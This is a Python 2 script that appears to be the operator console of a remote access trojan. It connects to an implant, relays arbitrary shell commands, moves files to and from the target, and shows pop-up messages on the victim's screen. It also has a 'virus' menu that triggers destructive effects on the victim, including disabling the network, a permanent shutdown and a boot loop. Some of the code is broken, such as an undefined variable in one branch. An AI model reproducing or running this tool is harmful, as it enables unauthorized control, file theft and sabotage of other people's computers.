import socket
import os
import sys
import base64

print '''

======================================================
======================================================
================ CREATED BY THE DUKE =================
======================================================
======================================================

Great power Comes Great Responsiblity
                            -Uncle Ben

Support us! SOLO

'''
MYNAME = sys.argv[0]
HOST = 'localhost'
PORT = 8083
LPORT = 9010

def download(FILENAME):
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((HOST, LPORT))
    sock.send(FILENAME)
    ifexist = sock.recv(1024)
    if ifexist == 'True':
        size = sock.recv(1024)
        opt = raw_input(' File do exist and is ' + size + 'B Do you want it? \n [y/n] >>')
        if opt == 'y':
         try:
            sock.send('GETIT')
            f= open(FILENAME , 'wb')
            data = sock.recv(1024)
            while True:
                f.write(data)
                data = sock.recv(1024)
                if data == 'ENDOFTHELINE':
                    break           
            sock.close()
         except KeyboardInterrupt:
            print 'DONE'
def upload(FILENAME):
    import socket, os
    sock=socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, LPORT))
    sock.listen(10)
    print ' 3Waiting...' 
    c, addr = sock.accept()
    print ' [+] Connected!'
    FILENAME = c.recv(1024)
    if os.path.isfile(FILENAME) == True:
        c.sendall('True')
        size = os.path.getsize(FILENAME)
        c.sendall(str(size))
        opt = c.recv(1024)
        if opt == 'GETIT':
            f = open(FILENAME , 'rb')
            data = f.read(1024)
            while data != '':
                c.sendall(data)
                data = f.read(1024)
            c.sendall('ENDOFTHELINE')
            print 'DONE'
    else:
        c.sendall('nOPE')
    sock.close()

def usage():
    print '''usage:
                    python server.py [HOST IP] [HOST PORT]'''
    quit('exiting...')
def main():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print 'connecting'
    s.connect((HOST, PORT))
    print 'connectewd'
    shell = s.recv(1024)
    while True:
        try:
            command = raw_input(shell + '> ')
            if command == 'upload':
                    s.send(command)
                    FILENAME = raw_input(' File NAME :')
                    s.send(FILENAME)
                    upload(FILENAME)
            elif command == 'message':
                    s.send(command)
                    s.send(raw_input('Message >> '))
                    s.send(raw_input('Title >> '))
                    print '''
    1: OK and Cancel
    2: Abort, Retry, Ignore
    3: Yes, No, Cancel
    4: Yes and No
    5: Retry and Cancel
    16: Critical message icon
    32: Warning query icon
    48: Warning message icon
    64: Information message icon
    4096: Always stay on top of the desktop
'''
                    s.send(raw_input('Button >>'))
            elif command == 'download':
                    s.send(command)
                    FILENAME = raw_input(' File Name :')
                    s.send(FILENAME)
                    download(FILENAME)
            elif command == 'virus':
                    s.send(command)
                    print '''

    SLNO NAME          Description
     1) cdpop        :  INSTANTLY POPS OUT CD
     2) flashscreen  :  KEEPS FLASHING THE SCREEN
     3) meltdown     :  SYSTEM SCREEN STARTS TO MELT
     4) DisableINET  :  NETWORK WILL BE DISABLED YOU MAY LOOSE THE CONN
     5) 4eversleep   :  SYSTEM SHUTS DOWN 4 EVER
     6) shutitdown   :  BOOTLOOP
     7) LEAVE BLANK LET HIM LIVE HIS LIFE
    Enter your choice >>'''
                    virusname = raw_input(" >> ")
                    s.send(virusname)
                    print s.recv(1024)
            elif command == 'giveprivilege':
                    FILENAME = raw_input(' Enter the FileName: ')
                    c.sendall(FILENAME)
                    print c.recv(1024)
            elif command[:2] == 'cd':
                    s.send(command)
                    data = s.recv(1024)
                    if data != 'The system cannot find the path specified.':
                        shell = data
            elif command == 'help':
                    print '''
    ### Network Info ###
        arp         : Display details about ARP routing tables
        ipconfig    : Display details about INET

    ### My Function ###
        upload      : upload Files to the target
        download    : download Files from target
        virus       : Displays diffrent virus and its functions
    ### Windows Command help ###

    ### For more information on a specific command, type HELP command-name ###
        ASSOC          Displays or modifies file extension associations.
        ATTRIB         Displays or changes file attributes.
        BREAK          Sets or clears extended CTRL+C checking.
        BCDEDIT        Sets properties in boot database to control boot loading.
        CACLS          Displays or modifies access control lists (ACLs) of files.
        CALL           Calls one batch program from another.
        CD             Displays the name of or changes the current directory.
        CHCP           Displays or sets the active code page number.
        CHDIR          Displays the name of or changes the current directory.
        CHKDSK         Checks a disk and displays a status report.
        CHKNTFS        Displays or modifies the checking of disk at boot time.
        CLS            Clears the screen.
        CMD            Starts a new instance of the Windows command interpreter.
        COLOR          Sets the default console foreground and background colors.
        COMP           Compares the contents of two files or sets of files.
        COMPACT        Displays or alters the compression of files on NTFS partitions.
        CONVERT        Converts FAT volumes to NTFS.  You cannot convert the current drive.
        COPY           Copies one or more files to another location.
        DATE           Displays or sets the date.
        DEL            Deletes one or more files.
        DIR            Displays a list of files and subdirectories in a directory.
        DISKPART       Displays or configures Disk Partition properties.
        DOSKEY         Edits command lines, recalls Windows commands, and creates macros.
        DRIVERQUERY    Displays current device driver status and properties.
        ECHO           Displays messages, or turns command echoing on or off.
        ENDLOCAL       Ends localization of environment changes in a batch file.
        ERASE          Deletes one or more files.
        EXIT           Quits the CMD.EXE program (command interpreter).
        FC             Compares two files or sets of files, and displays the differences between them.
        FIND           Searches for a text string in a file or files.
        FINDSTR        Searches for strings in files.
        FOR            Runs a specified command for each file in a set of files.
        FORMAT         Formats a disk for use with Windows.
        FSUTIL         Displays or configures the file system properties.
        FTYPE          Displays or modifies file types used in file extension associations.
        GOTO           Directs the Windows command interpreter to a labeled line in a batch program.
        GPRESULT       Displays Group Policy information for machine or user.
        GRAFTABL       Enables Windows to display an extended character set in graphics mode.
        HELP           Provides Help information for Windows commands.
        ICACLS         Display, modify, backup, or restore ACLs for files and directories.
        IF             Performs conditional processing in batch programs.
        LABEL          Creates, changes, or deletes the volume label of a disk.
        MD             Creates a directory.
        MKDIR          Creates a directory.
        MKLINK         Creates Symbolic Links and Hard Links
        MODE           Configures a system device.
        MORE           Displays output one screen at a time.
        MOVE           Moves one or more files from one directory to another directory.
        OPENFILES      Displays files opened by remote users for a file share.
        PATH           Displays or sets a search path for executable files.
        PAUSE          Suspends processing of a batch file and displays a message.
        POPD           Restores the previous value of the current directory saved by PUSHD.
        PRINT          Prints a text file.
        PROMPT         Changes the Windows command prompt.
        PUSHD          Saves the current directory then changes it.
        RD             Removes a directory.
        RECOVER        Recovers readable information from a bad or defective disk.
        REM            Records comments (remarks) in batch files or CONFIG.SYS.
        REN            Renames a file or files.
        RENAME         Renames a file or files.
        REPLACE        Replaces files.
        RMDIR          Removes a directory.
        ROBOCOPY       Advanced utility to copy files and directory trees
        SET            Displays, sets, or removes Windows environment variables.
        SETLOCAL       Begins localization of environment changes in a batch file.
        SC             Displays or configures services (background processes).
        SCHTASKS       Schedules commands and programs to run on a computer.
        SHIFT          Shifts the position of replaceable parameters in batch files.
        SHUTDOWN       Allows proper local or remote shutdown of machine.
        SORT           Sorts input.
        START          Starts a separate window to run a specified program or command.
        SUBST          Associates a path with a drive letter.
        SYSTEMINFO     Displays machine specific properties and configuration.
        TASKLIST       Displays all currently running tasks including services.
        TASKKILL       Kill or stop a running process or application.
        TIME           Displays or sets the system time.
        TITLE          Sets the window title for a CMD.EXE session.
        TREE           Graphically displays the directory structure of a drive or path.
        TYPE           Displays the contents of a text file.
        VER            Displays the Windows version.
        VERIFY         Tells Windows whether to verify that your files are written correctly to a disk.
        VOL            Displays a disk volume label and serial number.
        XCOPY          Copies files and directory trees.
        WMIC           Displays WMI information inside interactive command shell.

        ### For more information on tools see the command-line reference in the online help. ###
'''
            elif command == '':
                command = 'NONE'
                pass
            else:
                    if command == 'download':
                        pass
                    elif command == 'upload':
                        pass
                    else:
                        s.send(command)
                    data = s.recv(1024)
                    if data == '':
                        if os.name == 'nt':
                            os.system('cls')
                        else:
                            os.system('clear')
                    else:
                        print data
            if command == 'NONE':
                pass
            else:
                print command
        except KeyboardInterrupt:
            pass
main()
